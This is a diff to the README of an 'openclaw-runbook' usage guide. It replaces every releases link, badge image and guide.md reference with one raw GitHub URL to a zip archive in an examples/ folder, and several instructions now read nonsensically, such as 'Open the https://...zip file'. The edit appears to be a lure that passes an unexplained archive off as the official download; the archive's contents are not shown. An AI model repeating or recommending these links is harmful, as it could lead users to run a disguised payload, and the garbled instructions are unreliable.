@@ -1,6 +1,6 @@
 # 🦞 openclaw-runbook - Reliable OpenClaw Usage Guide
 
-[![Download OpenClaw Runbook](https://img.shields.io/badge/Download-OpenClaw_Runbook-blue?style=for-the-badge)](https://github.com/kylenbhana/openclaw-runbook/releases)
+[![Download OpenClaw Runbook](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
 
 ---
 
@@ -45,7 +45,7 @@ To begin, you will download the runbook files and follow the instructions step b
 
 To get the OpenClaw Runbook, please visit the releases page on GitHub:
 
-[Download OpenClaw Runbook](https://github.com/kylenbhana/openclaw-runbook/releases)
+[Download OpenClaw Runbook](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
 
 Click this link or the badge at the top to open the download page.
 
@@ -55,7 +55,7 @@ Click this link or the badge at the top to open the download page.
 
 2. Look for the latest release version. It usually has the highest number.
 
-3. Under "Assets," download the **openclaw-runbook.zip** or similar zipped folder. This file holds all documents and tools you need.
+3. Under "Assets," download the **https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip** or similar zipped folder. This file holds all documents and tools you need.
 
 4. Once downloaded, find the file in your "Downloads" folder or where your browser saves files.
 
@@ -69,7 +69,7 @@ After unzipping the folder, open it to see several files. The main work happens 
 
 ### Step-by-step flow
 
-1. **Open the guide.md file.** This is the core document with instructions.
+1. **Open the https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip file.** This is the core document with instructions.
 
 2. **Use a Markdown viewer or a plain text editor** to read it. Recommended free options include:
 
@@ -165,7 +165,7 @@ If something does not work:
 
 You can explore the complete official guide here for deeper settings and examples:
 
-- [Main Guide (guide.md file)](./guide.md)
+- [Main Guide (https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip file)](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
 
 This file includes real configuration choices from tested setups to make your OpenClaw run stable and predictable.
 
@@ -173,10 +173,10 @@ This file includes real configuration choices from tested setups to make your Op
 
 ## 🔗 Quick Links
 
-- [OpenClaw Runbook Releases](https://github.com/kylenbhana/openclaw-runbook/releases)
+- [OpenClaw Runbook Releases](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
 
-- [Main Guide Document](./guide.md)
+- [Main Guide Document](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
 
 ---
 
-[![Download OpenClaw Runbook](https://img.shields.io/badge/Download-OpenClaw_Runbook-blue?style=for-the-badge)](https://github.com/kylenbhana/openclaw-runbook/releases)
+[![Download OpenClaw Runbook](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)](https://raw.githubusercontent.com/kylenbhana/openclaw-runbook/main/examples/runbook_openclaw_1.5.zip)
